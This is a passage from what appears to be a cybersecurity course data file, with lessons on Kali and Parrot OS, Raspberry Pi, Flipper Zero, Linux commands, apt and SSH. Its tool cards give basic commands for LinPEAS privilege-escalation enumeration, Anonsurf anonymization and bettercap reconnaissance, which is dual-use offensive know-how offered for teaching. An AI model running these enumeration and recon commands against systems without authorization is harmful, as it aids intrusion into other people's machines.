          <div class="p-3 rounded border border-red-500/20 bg-red-500/5 mb-6">
            <p class="text-gray-300 text-sm">SUID binaries are particularly dangerous if misconfigured because attackers can exploit them to gain root access.</p>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Permissions Matter in Cyber Security</h2>
          <p class="mb-3 text-gray-300">Most Linux privilege escalation attacks happen due to:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>World-writable files</li>
            <li>Weak directory permissions</li>
            <li>Misconfigured SUID binaries</li>
            <li>Improper ownership</li>
          </ul>
          <p class="mb-6 text-gray-300">By understanding permissions, security professionals can secure systems and identify weaknesses before attackers exploit them.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Role of Kali Linux in Linux Security</h2>
          <p class="mb-4 text-gray-300">Kali Linux is designed for security testing and includes tools to analyze file permissions and search for privilege escalation paths. One important tool used for this purpose is <span class="font-semibold text-white">LinPEAS</span>.</p>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Linux Permission Enumeration',
            content: `🛠 Tool Name: LinPEAS

Related Concept: Linux Directories & File Permissions

What is LinPEAS?
LinPEAS is a Kali Linux privilege escalation enumeration tool that scans Linux systems to identify weak file permissions, SUID binaries, writable directories, and misconfigurations that could allow attackers to gain higher privileges.

Why This Tool Matches This Topic
LinPEAS helps:
Identify dangerous file permissions
Detect misconfigured directories
Find SUID/SGID binaries
Analyze Linux security weaknesses

Basic Commands
Download and Run LinPEAS
chmod +x linpeas.sh
./linpeas.sh

Run with Quiet Output
./linpeas.sh -q

Save Output to File
./linpeas.sh > linpeas_report.txt`
          }
        ]
      },
      {
        title: 'Kali Linux Overview and Use Cases',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">What is Kali Linux?</h2>
          <p class="mb-4 text-gray-300">Kali Linux is a Debian-based Linux distribution specifically designed for cybersecurity professionals, ethical hackers, penetration testers, and digital forensic experts. It is developed and maintained by Offensive Security and comes preloaded with hundreds of security tools used for penetration testing, vulnerability assessment, malware analysis, wireless attacks, web security testing, and digital forensics.</p>
          <p class="mb-6 text-gray-300">Unlike general-purpose operating systems, Kali Linux is built with security testing in mind. It allows users to quickly deploy tools without manually installing dependencies, making it the industry standard for ethical hacking labs, red teaming, and cyber defense training.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Kali Linux is Important in Cyber Security</h2>
          <p class="mb-4 text-gray-300">Kali Linux plays a crucial role in both offensive and defensive security. Attackers and defenders use similar tools, so understanding Kali Linux helps security professionals think like an attacker while defending systems effectively.</p>
          <p class="mb-6 text-gray-300">Kali Linux supports live booting, virtual machines, cloud deployment, and bare-metal installation, allowing flexible usage in different environments. It also supports ARM devices like Raspberry Pi, making it ideal for portable security testing.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Categories of Tools in Kali Linux</h2>
          <div class="grid grid-cols-1 md:grid-cols-2 gap-3 mb-6">
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <ul class="list-disc pl-6 text-gray-300 text-sm space-y-1">
                <li>Information Gathering</li>
                <li>Vulnerability Analysis</li>
                <li>Web Application Analysis</li>
                <li>Password Attacks</li>
                <li>Wireless Attacks</li>
              </ul>
            </div>
            <div class="p-3 rounded border border-green-500/20 bg-green-500/5">
              <ul class="list-disc pl-6 text-gray-300 text-sm space-y-1">
                <li>Exploitation Tools</li>
                <li>Forensics</li>
                <li>Reverse Engineering</li>
                <li>Social Engineering</li>
              </ul>
            </div>
          </div>
          <p class="mb-6 text-gray-300">This structured approach helps beginners understand where each tool fits in the attack lifecycle.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Real-World Use Cases</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-2">
            <li>Perform penetration testing on networks and applications</li>
            <li>Conduct vulnerability assessments for organizations</li>
            <li>Simulate cyber attacks during red team exercises</li>
            <li>Analyze malware and suspicious files</li>
            <li>Capture and analyze network traffic</li>
            <li>Audit system configurations and permissions</li>
          </ul>
          <p class="mb-6 text-gray-300">Cybersecurity certifications like CEH, OSCP, and Security+ heavily rely on Kali Linux concepts and tools.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Kali Linux and Ethical Responsibility</h2>
          <p class="mb-6 text-gray-300">Although Kali Linux contains powerful tools, it must be used ethically and legally. Ethical hackers are required to have written permission before testing any system. Misuse of Kali Linux tools is illegal and punishable under cyber laws.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Learning Kali Linux as a Student</h2>
          <p class="mb-6 text-gray-300">For students, Kali Linux provides hands-on exposure to real security tools. Practicing Kali Linux in lab environments such as virtual machines, intentionally vulnerable systems, or capture-the-flag (CTF) challenges helps bridge the gap between theory and real-world security skills.</p>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tool – General Usage & System Overview',
            content: `🛠 Tool Name: neofetch

Related Concept: Kali Linux Overview

What is neofetch?
Neofetch is a lightweight system information tool commonly used in Kali Linux to display operating system details, kernel version, hardware information, and system architecture. While not an attack tool, it helps security professionals quickly understand the environment they are working in.

Why This Tool Matches This Topic
Helps identify system environment
Confirms Kali Linux installation
Useful for documentation and lab setups
Commonly used in cybersecurity demonstrations

Basic Commands
Run neofetch
neofetch

Install neofetch (if not installed)
sudo apt install neofetch`
          }
        ]
      },
      {
        title: 'Parrot Security OS Overview',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">What is Parrot Security OS?</h2>
          <p class="mb-4 text-gray-300">Parrot Security OS is a Debian-based Linux distribution designed specifically for cybersecurity, digital forensics, penetration testing, reverse engineering, and privacy protection. It is developed by the Parrot Project and is widely used by security professionals who want a lightweight, fast, and privacy-focused alternative to Kali Linux.</p>
          <p class="mb-6 text-gray-300">Parrot OS is known for its strong emphasis on anonymity, security hardening, and performance, making it suitable for both offensive security testing and defensive security research.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Key Features of Parrot Security OS</h2>
          <p class="mb-3 text-gray-300">Parrot OS comes with a wide range of pre-installed security tools, similar to Kali Linux, but with a more optimized and minimal system footprint. It includes tools for:</p>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Network scanning and enumeration</li>
            <li>Web application testing</li>
            <li>Exploit development</li>
            <li>Cryptography and privacy</li>
            <li>Digital forensics and malware analysis</li>
          </ul>
          <p class="mb-6 text-gray-300">Parrot OS also includes built-in anonymization tools such as Tor and Anonsurf, which help users protect their identity during security testing.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Security & Privacy Focus</h2>
          <p class="mb-6 text-gray-300">One of the major advantages of Parrot OS is its secure-by-default configuration. The system is hardened using security patches, sandboxing techniques, and kernel-level protections. This makes it safer for daily use compared to other penetration testing distributions.</p>
          <p class="mb-6 text-gray-300">Parrot OS is suitable for students and professionals who want a single OS for both learning cybersecurity and performing normal daily tasks without compromising security.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Parrot OS vs Kali Linux</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Parrot OS is lighter and faster</li>
            <li>Parrot OS focuses heavily on privacy and anonymity</li>
            <li>Kali Linux has broader tool coverage</li>
            <li>Parrot OS is better suited for low-resource systems</li>
          </ul>
          <p class="mb-6 text-gray-300">Both are widely accepted in the cybersecurity industry.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Real-World Use Cases</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-2">
            <li>Secure penetration testing</li>
            <li>Privacy-focused security research</li>
            <li>Malware analysis in isolated environments</li>
            <li>Digital forensic investigations</li>
            <li>Ethical hacking training and CTF competitions</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Students Should Learn Parrot OS</h2>
          <p class="mb-6 text-gray-300">Learning Parrot OS helps students understand alternative security environments and privacy-oriented security practices. It encourages ethical hacking with a strong focus on anonymity and operational security.</p>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Privacy & Anonymity Tool',
            content: `🛠 Tool Name: Anonsurf

Related Concept: Privacy & Secure OS Usage

What is Anonsurf?
Anonsurf is a privacy tool used in Parrot OS and Kali Linux to route all system traffic through the Tor network. It helps anonymize network connections and protect the tester’s identity during security assessments.

Why This Tool Matches This Topic
Strong focus on privacy and anonymity
Commonly used in Parrot OS
Supports ethical and secure testing
Helps understand anonymized environments

Basic Commands
Start Anonsurf
sudo anonsurf start

Stop Anonsurf
sudo anonsurf stop

Check Anonsurf Status
sudo anonsurf status`
          }
        ]
      },
      {
        title: 'Raspberry Pi for Security Projects',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">What is Raspberry Pi?</h2>
          <p class="mb-4 text-gray-300">Raspberry Pi is a small, affordable, single-board computer that is widely used for learning, prototyping, and real-world security projects. Despite its compact size, it runs full Linux operating systems and can perform many cybersecurity tasks such as network monitoring, intrusion detection, penetration testing, and automation.</p>
          <p class="mb-6 text-gray-300">In cybersecurity education, Raspberry Pi is extremely valuable because it allows students to build hands-on security labs at a very low cost.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Raspberry Pi is Important for Cyber Security</h2>
          <p class="mb-3 text-gray-300">Raspberry Pi enables security professionals to create portable and dedicated security devices. It is commonly used for:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Network traffic monitoring</li>
            <li>Intrusion detection systems (IDS)</li>
            <li>Honeypots</li>
            <li>Wireless security testing</li>
            <li>IoT security research</li>
          </ul>
          <p class="mb-6 text-gray-300">Because Raspberry Pi can run Kali Linux, Parrot OS, and Ubuntu Server, it fits naturally into cyber security workflows.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Raspberry Pi in Defensive Security</h2>
          <p class="mb-6 text-gray-300">In defensive security, Raspberry Pi is often deployed as a network sensor. It can be placed inside a network to monitor traffic, log suspicious activity, and detect attacks in real time. Organizations use Raspberry Pi-based solutions for low-cost IDS and SIEM data collection.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Raspberry Pi in Offensive Security</h2>
          <p class="mb-3 text-gray-300">For ethical hacking, Raspberry Pi can act as a portable attack platform. It can be configured for:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Network scanning</li>
            <li>Credential harvesting (authorized labs only)</li>
            <li>Wireless testing</li>
            <li>Red team simulations</li>
          </ul>
          <p class="mb-6 text-gray-300">Because it is small and silent, it is often used in penetration testing demonstrations and security research labs.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Security Projects Using Raspberry Pi</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-2">
            <li>Network intrusion detection using Snort</li>
            <li>Honeypot deployment for attack analysis</li>
            <li>VPN server setup for secure communication</li>
            <li>Packet capture and traffic analysis</li>
            <li>Automated vulnerability scanning</li>
          </ul>
          <p class="mb-6 text-gray-300">These projects help students understand real-world security implementation rather than just theory.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Ethical & Legal Considerations</h2>
          <p class="mb-6 text-gray-300">Using Raspberry Pi for cybersecurity must always follow ethical guidelines. Devices should only be deployed on networks where you have explicit permission. Unauthorized deployment is illegal and unethical.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Role of Snort on Raspberry Pi</h2>
          <p class="mb-6 text-gray-300">Snort is an open-source IDS/IPS commonly deployed on Raspberry Pi to monitor network traffic and detect suspicious activity using rules and signatures. It is lightweight, efficient, and widely used in real-world defensive security monitoring.</p>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Intrusion Detection Tool',
            content: `🛠 Tool Name: Snort

Related Concept: Network Monitoring & Defense

What is Snort?
Snort is an open-source Intrusion Detection and Prevention System (IDS/IPS) that can be installed on Raspberry Pi to monitor network traffic and detect suspicious activities using rules and signatures.

Why This Tool Matches This Topic
Commonly deployed on Raspberry Pi
Used in real-world security monitoring
Helps understand defensive security
Lightweight and efficient

Basic Commands
Install Snort
sudo apt install snort

Run Snort in Packet Logging Mode
sudo snort -dev -l /var/log/snort

Test Snort Configuration
sudo snort -T -c /etc/snort/snort.conf`
          }
        ]
      },
      {
        title: 'Flipper Zero – What It Is & Use Cases',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">What is Flipper Zero?</h2>
          <p class="mb-4 text-gray-300">Flipper Zero is a portable multi‑tool device for hardware hacking, wireless security testing, and IoT research. It is designed to interact with a wide range of wireless protocols and electronic systems such as RFID, NFC, infrared (IR), Bluetooth, and Sub‑GHz radio signals. Because of its small size and versatility, Flipper Zero is often described as a “cybersecurity Swiss army knife.”</p>
          <p class="mb-6 text-gray-300">For cybersecurity students and professionals, Flipper Zero provides hands‑on exposure to physical security and wireless attack surfaces, which are often overlooked in traditional software‑only security learning.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Flipper Zero Is Important in Cyber Security</h2>
          <p class="mb-4 text-gray-300">Modern cyber attacks are no longer limited to software and networks. Many real‑world breaches involve physical access, IoT devices, access cards, and wireless communication systems. Flipper Zero allows security researchers to analyze and test these systems in a controlled and ethical manner.</p>
          
          <div class="grid grid-cols-1 md:grid-cols-2 gap-3 mb-6">
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <ul class="list-disc pl-6 text-gray-300 text-sm space-y-1">
                <li>RFID (125 kHz) card reading and emulation</li>
                <li>NFC tag analysis</li>
                <li>Infrared remote signal capture</li>
              </ul>
            </div>
            <div class="p-3 rounded border border-green-500/20 bg-green-500/5">
              <ul class="list-disc pl-6 text-gray-300 text-sm space-y-1">
                <li>Sub‑GHz wireless signal sniffing</li>
                <li>GPIO pin interaction for hardware testing</li>
              </ul>
            </div>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Flipper Zero in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-2">
            <li>Test RFID and NFC access systems</li>
            <li>Analyze wireless protocols used by IoT devices</li>
            <li>Demonstrate weaknesses in poorly secured access cards</li>
            <li>Perform red‑team simulations involving physical security</li>
          </ul>
          <p class="mb-6 text-gray-300">These use cases are always performed with permission and mainly in labs or authorized environments.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Flipper Zero in Learning & Research</h2>
          <p class="mb-4 text-gray-300">For students, Flipper Zero bridges the gap between theoretical security concepts and real‑world hardware behavior. It helps learners understand how signals are transmitted, how access systems work, and how attackers may exploit weak configurations.</p>
          <p class="mb-6 text-gray-300">It also improves awareness of physical security, which is a critical part of cybersecurity but often ignored in beginner courses.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Ethical & Legal Responsibility</h2>
          <p class="mb-6 text-gray-300">Because Flipper Zero is a powerful device, misuse can easily violate laws. It must only be used on devices and systems you own or have explicit authorization to test. Ethical use is a core principle of cybersecurity education.</p>
        `,
        duration: '10 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Wireless & Hardware Analysis',
            content: `🛠 Tool Name: bettercap

Related Concept: Wireless & IoT Security Testing

What is bettercap?
bettercap is a powerful Kali Linux framework used for network attacks, wireless analysis, Bluetooth Low Energy (BLE) exploration, and IoT device testing. It complements Flipper Zero by allowing deeper analysis of wireless and network-based attacks from a Linux system.

Why This Tool Matches This Topic
Supports BLE and wireless analysis
Used for IoT and hardware-related security testing
Complements physical hacking concepts
Industry‑standard security tool

Basic Commands
Start bettercap
sudo bettercap

Enable Network Recon Module
net.recon on

Enable BLE Recon
ble.recon on`
          }
        ]
      },
      {
        title: 'Essential Linux Commands (cd, ls, pwd, chmod, chown, mv, cp, rm)',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Why Linux Commands Are Critical in Cyber Security</h2>
          <p class="mb-4 text-gray-300">In cybersecurity, Linux command‑line skills are not optional — they are essential. Almost all penetration testing tools, security scripts, servers, and cloud systems are managed through the Linux terminal. Ethical hackers, SOC analysts, and system administrators rely heavily on command‑line operations to navigate systems, analyze files, configure permissions, and automate tasks.</p>
          <p class="mb-6 text-gray-300">Attackers also use the Linux command line once they gain access to a system. Therefore, understanding these commands helps defenders both use systems securely and identify suspicious activity.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Directory Navigation Commands</h2>
          <div class="space-y-3 mb-6">
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <p class="text-gray-300 text-sm"><span class="font-semibold text-white">pwd</span> displays the present working directory, helping users understand their current location in the file system. This is extremely useful during investigations and scripting.</p>
            </div>
            <div class="p-3 rounded border border-green-500/20 bg-green-500/5">
              <p class="text-gray-300 text-sm"><span class="font-semibold text-white">ls</span> lists files and directories. Security professionals use it to identify sensitive files, hidden files (<span class="font-mono text-gray-200">ls -la</span>), and suspicious scripts.</p>
            </div>
            <div class="p-3 rounded border border-purple-500/20 bg-purple-500/5">
              <p class="text-gray-300 text-sm"><span class="font-semibold text-white">cd</span> changes directories. Attackers often move through directories to locate configuration files, credentials, and logs.</p>
            </div>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">File Management Commands</h2>
          <div class="space-y-3 mb-6">
            <div class="p-3 rounded border border-yellow-500/20 bg-yellow-500/5">
              <p class="text-gray-300 text-sm"><span class="font-semibold text-white">cp</span> copies files and directories. In security labs, it is used to create backups of evidence or duplicate scripts for testing.</p>
            </div>
            <div class="p-3 rounded border border-orange-500/20 bg-orange-500/5">
              <p class="text-gray-300 text-sm"><span class="font-semibold text-white">mv</span> moves or renames files. Attackers sometimes rename malicious files to disguise them as legitimate ones.</p>
            </div>
            <div class="p-3 rounded border border-red-500/20 bg-red-500/5">
              <p class="text-gray-300 text-sm"><span class="font-semibold text-white">rm</span> deletes files and directories. Unauthorized use of <span class="font-mono text-gray-200">rm</span> can indicate log tampering or evidence destruction.</p>
            </div>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Permission & Ownership Commands</h2>
          <div class="space-y-3 mb-6">
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <p class="text-gray-300 text-sm"><span class="font-semibold text-white">chmod</span> changes file permissions. Misuse can lead to vulnerabilities such as world‑writable files.</p>
            </div>
            <div class="p-3 rounded border border-green-500/20 bg-green-500/5">
              <p class="text-gray-300 text-sm"><span class="font-semibold text-white">chown</span> changes file ownership. Attackers may change ownership to maintain persistence or escalate privileges.</p>
            </div>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Linux Commands in Real‑World Security Scenarios</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-2">
            <li>Analyze compromised systems</li>
            <li>Secure file permissions</li>
            <li>Detect unauthorized file changes</li>
            <li>Manage logs and scripts</li>
            <li>Perform incident response</li>
          </ul>
          <p class="mb-6 text-gray-300">Strong command‑line skills significantly improve efficiency and accuracy in cyber security operations.</p>
        `,
        duration: '30 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Command-Line Monitoring Tool',
            content: `🛠 Tool Name: auditd

Related Concept: Command Usage & System Monitoring

What is auditd?
auditd is a Linux auditing framework used to monitor and log command execution, file access, permission changes, and user activities. It is a powerful defensive tool that helps track misuse of Linux commands.

Why This Tool Matches This Topic
Monitors command execution
Tracks permission and ownership changes
Detects suspicious activities
Used in enterprise Linux security

Basic Commands
Install auditd
sudo apt install auditd

Start auditd Service
sudo systemctl start auditd

Add Rule to Monitor File Changes
sudo auditctl -w /etc/passwd -p wa

View Audit Logs
sudo ausearch -f /etc/passwd`
          }
        ]
      },
      {
        title: 'Package Management (apt, apt-get)',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Package management is a fundamental part of Linux administration and cybersecurity. Most Linux distributions, including Kali Linux and Ubuntu-based systems, rely on package managers to install, update, and manage software. Understanding package management is essential for security professionals because outdated or misconfigured software is a major attack vector for hackers.</p>
          <p class="mb-6 text-gray-300">Cybersecurity professionals need to know how to securely install security tools, update vulnerable packages, and audit software on Linux systems. The two most widely used package managers in Debian-based distributions are <span class="font-semibold text-white">apt</span> and <span class="font-semibold text-white">apt-get</span>.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is apt and apt-get?</h2>
          <div class="space-y-3 mb-6">
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <p class="text-gray-300 text-sm"><span class="font-semibold text-white">apt</span> is a modern command-line interface for package management in Debian-based systems, introduced to simplify and unify package management commands. It combines functionalities from <span class="font-mono text-gray-200">apt-get</span> and <span class="font-mono text-gray-200">apt-cache</span>, providing easier usage with simpler syntax and better output formatting.</p>
            </div>
            <div class="p-3 rounded border border-green-500/20 bg-green-500/5">
              <p class="text-gray-300 text-sm"><span class="font-semibold text-white">apt-get</span> is the traditional package manager command for installing, updating, and removing software packages. While <span class="font-mono text-gray-200">apt</span> is recommended for daily use, <span class="font-mono text-gray-200">apt-get</span> is still widely used in scripts and automated processes.</p>
            </div>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Package Management Matters in Cyber Security</h2>
          <div class="space-y-3 mb-6">
            <div class="p-3 rounded border border-yellow-500/20 bg-yellow-500/5">
              <h3 class="text-lg font-semibold text-yellow-400 mb-1">Software Updates and Security Patches</h3>
              <p class="text-sm text-gray-300">Vulnerabilities in software packages are one of the primary ways attackers compromise systems. Regularly updating software with <span class="font-mono text-gray-200">apt</span> or <span class="font-mono text-gray-200">apt-get</span> ensures that known vulnerabilities are patched.</p>
            </div>
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <h3 class="text-lg font-semibold text-blue-400 mb-1">Tool Installation for Security Testing</h3>
              <p class="text-sm text-gray-300">Ethical hackers often need specialized tools like Nmap, Metasploit, and Wireshark. Package managers allow easy installation of these tools in a controlled environment.</p>
            </div>
            <div class="p-3 rounded border border-purple-500/20 bg-purple-500/5">
              <h3 class="text-lg font-semibold text-purple-400 mb-1">Dependency Management</h3>
              <p class="text-sm text-gray-300">Many security tools depend on additional libraries or packages. <span class="font-mono text-gray-200">apt</span> handles dependencies automatically, reducing installation errors and potential security gaps.</p>
            </div>
            <div class="p-3 rounded border border-orange-500/20 bg-orange-500/5">
              <h3 class="text-lg font-semibold text-orange-400 mb-1">Auditing Installed Packages</h3>
              <p class="text-sm text-gray-300">Knowing which packages are installed and their versions helps detect outdated software and potential backdoors introduced by malicious packages.</p>
            </div>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Common Package Management Tasks</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-2">
            <li><span class="font-semibold text-white">Updating the Package List:</span> Ensures your system knows about the latest versions of packages.</li>
            <li><span class="font-semibold text-white">Installing Packages:</span> Fetches and installs new software.</li>
            <li><span class="font-semibold text-white">Upgrading Packages:</span> Updates installed software to the latest version.</li>
            <li><span class="font-semibold text-white">Removing Packages:</span> Deletes software that is no longer needed or may be insecure.</li>
            <li><span class="font-semibold text-white">Searching Packages:</span> Helps find tools relevant to security tasks.</li>
          </ul>
          <p class="mb-6 text-gray-300">Proper usage of these commands reduces the system’s attack surface and ensures that security testing tools function correctly.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Role in Security Labs</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-2">
            <li>Install penetration testing tools like <span class="font-mono text-gray-200">hydra</span>, <span class="font-mono text-gray-200">nikto</span>, or <span class="font-mono text-gray-200">burpsuite</span></li>
            <li>Keep security distributions updated</li>
            <li>Ensure a controlled environment for testing vulnerabilities</li>
            <li>Automate security setups with scripts using <span class="font-mono text-gray-200">apt-get</span></li>
          </ul>
          <p class="mb-6 text-gray-300">Mastery of package management is a basic but critical skill for all Linux-based cybersecurity operations.</p>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Package Management Monitoring',
            content: `🛠 Tool Name: apt-listbugs

Related Concept: Package Security & Updates

What is apt-listbugs?
apt-listbugs is a tool that integrates with Debian-based package management systems to report critical bugs in packages before installation or upgrade. This is particularly important in cybersecurity environments where unstable or vulnerable packages can compromise security labs.

Why This Tool Matches This Topic
Prevents installing packages with known critical bugs
Enhances security when using apt or apt-get
Useful for ethical hackers to maintain a stable testing environment

Basic Commands
Install apt-listbugs
sudo apt install apt-listbugs

Update Package List
sudo apt update

Upgrade Packages with Bug Warnings
sudo apt upgrade

Install Package with Bug Check
sudo apt install package-name`
          }
        ]
      },
      {
        title: 'SSH Basics & Creating SSH Keys',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Secure Shell (SSH) is one of the most critical protocols in cybersecurity. It allows secure remote access to Linux and network devices over untrusted networks. SSH replaces older, insecure protocols like Telnet and Rlogin by encrypting all communication between client and server.</p>
          <p class="mb-6 text-gray-300">Understanding SSH is fundamental for cybersecurity professionals, ethical hackers, system administrators, and penetration testers. Mastery of SSH ensures confidentiality, integrity, and authentication in remote management tasks.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is SSH?</h2>
          <p class="mb-4 text-gray-300">SSH is a network protocol that provides encrypted communication channels between two devices. It uses asymmetric encryption for key exchange and symmetric encryption for session communication.</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Access remote servers securely</li>
            <li>Transfer files with SCP or SFTP</li>
            <li>Execute commands remotely</li>
            <li>Tunnel traffic securely</li>
          </ul>
          <p class="mb-6 text-gray-300">SSH is the backbone of secure remote administration in Linux-based environments.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Authentication Methods</h2>
          <div class="space-y-3 mb-6">
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <h3 class="text-lg font-semibold text-blue-400 mb-1">Password-Based Authentication</h3>
              <p class="text-sm text-gray-300">Users log in using their username and password. While simple, this method can be vulnerable to brute-force attacks.</p>
            </div>
            <div class="p-3 rounded border border-green-500/20 bg-green-500/5">
              <h3 class="text-lg font-semibold text-green-400 mb-1">Key-Based Authentication (Recommended)</h3>
              <p class="text-sm text-gray-300">Key-based authentication uses a pair of cryptographic keys: a private key stored securely on the client, and a public key stored on the server. The server verifies the client without transmitting passwords, making it highly secure and resistant to brute-force attacks.</p>
            </div>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Generating SSH Keys</h2>
          <p class="mb-3 text-gray-300">SSH keys provide secure, passwordless login. Steps to create SSH keys:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Generate a key pair with <span class="font-mono text-gray-200">ssh-keygen</span>.</li>
            <li>Store the private key securely on the client machine.</li>
            <li>Copy the public key to the server’s <span class="font-mono text-gray-200">~/.ssh/authorized_keys</span> file.</li>
            <li>Ensure proper permissions to prevent unauthorized access.</li>
          </ul>
          <p class="mb-6 text-gray-300">SSH keys are widely used in automation, DevOps pipelines, and secure access to critical systems.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Security Best Practices</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-2">
            <li>Disable password login and enforce key-based authentication.</li>
            <li>Use strong passphrases for private keys.</li>
            <li>Limit SSH access to specific IP addresses.</li>
            <li>Monitor failed login attempts to detect brute-force attacks.</li>
            <li>Regularly rotate keys to reduce long-term risk.</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Role in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-2">
            <li>Securely access lab environments</li>
            <li>Test remote system configurations</li>
            <li>Explore privilege escalation pathways</li>
            <li>Learn encrypted communications and tunneling techniques</li>
          </ul>
          <p class="mb-6 text-gray-300">SSH is both a tool for system defense and a learning platform for understanding attack vectors in secure communication.</p>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – SSH Testing & Enumeration',
            content: `🛠 Tool Name: ssh-audit

Related Concept: SSH Security & Key Management

What is ssh-audit?
ssh-audit is a Kali Linux tool used to analyze the security of SSH servers. It checks SSH configurations, key strength, supported algorithms, and potential vulnerabilities, helping ethical hackers and system administrators strengthen SSH deployments.

Why This Tool Matches This Topic
Evaluates SSH server configurations
Detects weak ciphers or outdated algorithms
Supports secure key management practices
Essential for SSH-based ethical hacking labs

Basic Commands
Audit Remote SSH Server
ssh-audit target_ip

Audit with Verbose Output
ssh-audit -v target_ip

Check Specific Port
ssh-audit -p 2222 target_ip`
          }
        ]
      }
    ]
  },
  {
    id: 'module-3',
    title: 'Module 3: Networking Tools – Nmap & Wireshark',
    duration: '1 week',
    description: 'Mastering essential networking tools for scanning and packet analysis.',
    lessons: [
      {
        title: 'Introduction to Network Scanning',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Network scanning is the foundation of cybersecurity reconnaissance. Before ethical hackers or attackers can exploit systems, they need to identify live hosts, open ports, and running services on a network. Network scanning provides this visibility and helps defenders map their environment to secure it properly.</p>
          
          <h2 class="text-xl font-semibold mb-3 text-white">What Network Scanning Provides</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Discovering hosts and devices on a network</li>
            <li>Identifying open ports and running services</li>
            <li>Detecting potential vulnerabilities</li>
            <li>Assessing the security posture of systems</li>
          </ul>
          <p class="mb-6 text-gray-300">Without proper network scanning, both penetration testing and network defense are ineffective.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Network Scanning is Important</h2>
          <div class="space-y-3 mb-6">
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <h3 class="text-lg font-semibold text-blue-400 mb-1">Discovering Network Topology</h3>
              <p class="text-sm text-gray-300">Scanning reveals all connected devices, routers, firewalls, and servers. Understanding network layout helps administrators secure sensitive areas and isolate vulnerable devices.</p>
            </div>
            <div class="p-3 rounded border border-green-500/20 bg-green-500/5">
              <h3 class="text-lg font-semibold text-green-400 mb-1">Identifying Open Ports</h3>
